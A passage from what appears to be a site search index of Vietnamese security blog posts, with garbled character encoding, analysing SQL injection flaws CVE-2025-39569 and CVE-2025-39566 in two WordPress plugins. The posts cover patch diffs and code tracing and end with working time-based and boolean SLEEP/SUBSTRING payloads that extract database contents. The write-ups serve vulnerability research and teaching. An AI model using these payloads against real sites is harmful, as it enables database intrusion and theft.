$wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: 